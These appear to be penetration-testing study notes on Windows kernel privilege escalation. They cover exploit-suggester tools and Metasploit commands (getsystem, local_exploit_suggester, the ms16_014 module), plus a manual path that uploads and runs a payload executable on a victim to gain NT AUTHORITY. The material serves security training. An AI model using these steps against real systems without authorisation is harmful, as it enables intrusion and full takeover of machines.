# 1 - Windows Kernel Exploitation

### **Windows Kernel**

* A Kernel is a computer program that is the core of an operating system and has complete control over every resource and hardware on a system. It acts as a translation layer between hardware and software and facilitates the communication between these two layers.
* **Windows NT** is the kernel that comes pre-packaged with all version of Microsoft Windows and operates as a traditional kernel with a few exceptions based on user design philosophy. It consists of two main modes of operation that determine access to system resources and hardware:
  * User Mode - Programs and services running in user mode have limited access to system resources and functionality.
  * Kernel Mode - Kernel mode has unrestricted access to system resources and functionality with the added functionality of managing devices and system memory.

### **Windows Kernel Exploitation**

* Kernel exploits on Windows will typically target vulnerabilities in the Windows kernel to execute arbitrary code in order to run privileged system commands or to obtain a system shell.
* This process will differ based on the version of Windows being targeted and the kernel exploit being used.
* Privilege escalation on Windows systems will typically follow the following methodology:
  * Identifying kernel vulnerabilities.
  * Downloading, compiling and transferring kernel exploits onto the target system.

### **Tools & Environment**

* **Windows-Exploit-Suggester** - This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploit and Metasploit modules available for the missing bulletins.
  * GitHub: [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* **Windows-Kernel-Exploits** - Collection of Windows Kernel exploits sorted by CVE.
  * GitHub: [https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135)



## **Practical Demonstration**

### Metasploit Exploitation

```bash
# Method 1
# Using Inbuilt cmd to evevate Privilege in a Meterpreter Session.
# it goes through a plateral of techniques in order to elevate our priv.
getsystem

# Method 2
# Metasploit module that enumerate vuln that can help us excalate our priv.
# step 1
search suggester  # works for both windows and linux.
# Enumerate vulnerabilites and correspondant msf modules for the target system (after gaining access).
use post/multi/recon/local_exploit_suggester
options
set SESSION 3  # it requires you select a meterpreter session for priv esc.
run  # Choose an exploit and enjoy!
# you can research on each of the exploits to know the one that works best based on you victim OS version.

# step 2
# in our own case we select the "ms16_014_wmi_recv_notif" xploit.
use exploit/windows/local/ms16_014_wmi_recv_notif
# it uses the default payload of 64bit.
options
set SESSION 3
set LPORT 4422
exploit

# we get a privileged meterpreter session
getuid  # we are NT AUTHORITY
```



### Mannual Exploitation

#### Step 1

Start by cloning Windows-Exploit-Suggester onto your VM.

Then run `shell` - to get a cmd prompt shell session on the victim PC.

Then run `systeminfo` - in the cmd prompt session.&#x20;

Copy-paste the results in a .txt file in your kali.

#### Step 2

`./windows-exploit-suggester.py` --update  - Download an updated vulnerability database in your kali.

`./windows-exploit-suggester.py --database <Latest_database.xls> --systeminfo <TXTfile>` - this runs the script and list every vulnerability of the target machine.

> \[E] -> exploitdb PoC.
>
> \[M] -> Metasploit module available.
>
> \[\*] -> Missing Bulletin.

Choose an exploit and enjoy!

You can search the suggested exploit from the SecWiki windows exploit lists.

[https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

#### Step 3

Copy the .exe executable payload to the target "/Temp" dir.

`cd C:\Temp` - in the low access meterpreter shell session.

`upload ~/payload.exe` - upload the payload.

`shell` - gives us a cmd prompt shell session, `ls` - to verify its uploaded.

`.\payload.exe` - to launch.

`whoami` - we get NT AUTHORITY..

